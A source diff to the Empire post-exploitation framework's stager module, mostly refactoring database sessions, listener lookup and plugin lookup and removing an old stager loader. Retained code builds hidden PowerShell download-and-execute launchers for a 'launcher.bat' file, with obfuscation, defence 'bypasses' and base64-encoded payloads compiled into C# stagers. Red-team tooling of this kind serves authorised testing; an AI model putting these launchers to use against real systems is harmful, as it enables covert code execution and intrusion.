@@ -36,7 +36,8 @@ import macholib.MachO
 from past.utils import old_div
 
 from empire.server.database import models
-from empire.server.database.base import Session
+from empire.server.database.base import SessionLocal
+from empire.server.v2.core.listener_service import ListenerService
 from . import helpers
 
 
@@ -47,59 +48,6 @@ class Stagers(object):
         self.mainMenu = MainMenu
         self.args = args
 
-        # stager module format:
-        #     [ ("stager_name", instance) ]
-        self.stagers = {}
-
-        self.load_stagers()
-
-
-    def load_stagers(self):
-        """
-        Load stagers from the install + "/stagers/*" path
-        """
-
-        rootPath = "%s/stagers/" % (self.mainMenu.installPath)
-        pattern = '*.py'
-
-        print(helpers.color("[*] Loading stagers from: %s" % (rootPath)))
-
-        for root, dirs, files in os.walk(rootPath):
-            for filename in fnmatch.filter(files, pattern):
-                filePath = os.path.join(root, filename)
-
-                # don't load up any of the templates
-                if fnmatch.fnmatch(filename, '*template.py'):
-                    continue
-
-                # extract just the module name from the full path
-                stagerName = filePath.split("/stagers/")[-1][0:-3]
-
-                # instantiate the module and save it to the internal cache
-                spec = importlib.util.spec_from_file_location(stagerName, filePath)
-                mod = importlib.util.module_from_spec(spec)
-                spec.loader.exec_module(mod)
-
-                stager = mod.Stager(self.mainMenu, [])
-                for key, value in stager.options.items():
-                    if value.get('SuggestedValues') is None:
-                        value['SuggestedValues'] = []
-                    if value.get('Strict') is None:
-                        value['Strict'] = False
-
-                self.stagers[stagerName] = stager
-
-
-    def set_stager_option(self, option, value):
-        """
-        Sets an option for all stagers.
-        """
-
-        for name, stager in self.stagers.items():
-            for stagerOption,stagerValue in stager.options.items():
-                if stagerOption == option:
-                    stager.options[option]['Value'] = str(value)
-
     def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
         #TODO add handle for other than powershell language
         stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
@@ -108,7 +56,6 @@ class Stagers(object):
         else:
             return stager
 
-
     def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="",
                           userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0',
                           safeChecks='true', bypasses: str = ''):
@@ -116,24 +63,26 @@ class Stagers(object):
         Abstracted functionality that invokes the generate_launcher() method for a given listener,
         if it exists.
         """
-        bypasses_parsed = []
-        for bypass in bypasses.split(' '):
-            b = Session().query(models.Bypass).filter(models.Bypass.name == bypass).first()
-            if b:
-                bypasses_parsed.append(b.code)
+        with SessionLocal.begin() as db:
+            bypasses_parsed = []
+            for bypass in bypasses.split(' '):
+                b = db.query(models.Bypass).filter(models.Bypass.name == bypass).first()
+                if b:
+                    bypasses_parsed.append(b.code)
 
-        if not listenerName in self.mainMenu.listeners.activeListeners:
-            print(helpers.color("[!] Invalid listener: %s" % (listenerName)))
-            return ''
+            db_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
+            active_listener = self.mainMenu.listenersv2.get_active_listeners()[db_listener.id] # todo another function for get 1
+            if not active_listener:
+                print(helpers.color(f"[!] Invalid listener: {listenerName}"))
+                return ''
 
-        activeListener = self.mainMenu.listeners.activeListeners[listenerName]
-        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']]\
-            .generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand,
-                               userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries,
-                               language=language, listenerName=listenerName, safeChecks=safeChecks,
-                               bypasses=bypasses_parsed)
-        if launcherCode:
-            return launcherCode
+            launcher_code = active_listener\
+                .generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand,
+                                   userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries,
+                                   language=language, listenerName=listenerName, safeChecks=safeChecks,
+                                   bypasses=bypasses_parsed)
+            if launcher_code:
+                return launcher_code
 
 
     def generate_dll(self, poshCode, arch):
@@ -175,7 +124,7 @@ class Stagers(object):
         posh_code = base64.b64encode(posh_code.encode("UTF-16LE")).decode("UTF-8")
         stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
 
-        compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
         if not compiler.status == 'ON':
             print(helpers.color('[!] csharpserver plugin not running'))
         else:
@@ -209,7 +158,7 @@ class Stagers(object):
         posh_code = base64.b64encode(posh_code.encode("UTF-8")).decode("UTF-8")
         stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
 
-        compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+        compiler = self.mainMenu.pluginsv2.get_by_id("csharpserver")
         if not compiler.status == 'ON':
             print(helpers.color('[!] csharpserver plugin not running'))
         else:
